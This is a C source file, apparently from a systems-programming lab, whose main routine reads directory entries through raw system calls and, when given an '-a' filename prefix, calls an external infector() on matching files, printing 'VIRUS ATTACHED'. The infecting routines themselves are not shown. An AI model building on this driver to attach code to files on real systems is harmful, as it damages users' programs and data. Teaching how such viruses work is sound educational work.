#include "util.h"
#include <dirent.h>

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_CLOSE 6
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SYS_OPEN 5
#define SHIRA_OFFSET 0x291

#define SYS_EXIT 231
#define STATUS_EXIT 0x55

extern int system_call();
extern int infection();
extern int infector();

int main(int argc, char *argv[], char *envp[])
{
    char buffer[8192];
    struct dirent * directoryPointer;
    int curr = 0;
    int clen = 0;

    int fd = system_call(SYS_OPEN, ".", 0);

    if (fd == -1)
    {
        system_call(SYS_EXIT, STATUS_EXIT);
    }

    curr = system_call(141, fd, buffer, 8192);
    int flagOfVirus = 0;

    char *filename;
    int i;




    for (i = 0; i < argc; i++)
    {
        if (strncmp(argv[i], "-a", 2) == 0)
        {
            flagOfVirus = 1;
            filename = argv[i] + 2;
        }
    }
    infection();

    while (clen < curr)
    {
        directoryPointer = (struct dirent *)(buffer + clen);  
        if ((flagOfVirus == 1) && (strncmp(filename,  directoryPointer->d_name - 1, strlen(filename)) == 0))
        {
            system_call(SYS_WRITE, STDOUT,  directoryPointer->d_name - 1, strlen( directoryPointer->d_name - 1));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
            system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED", 14);
            infector(filename);
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        clen = clen +  directoryPointer->d_reclen;
    }

    system_call(SYS_CLOSE, fd);

    return 0;
}
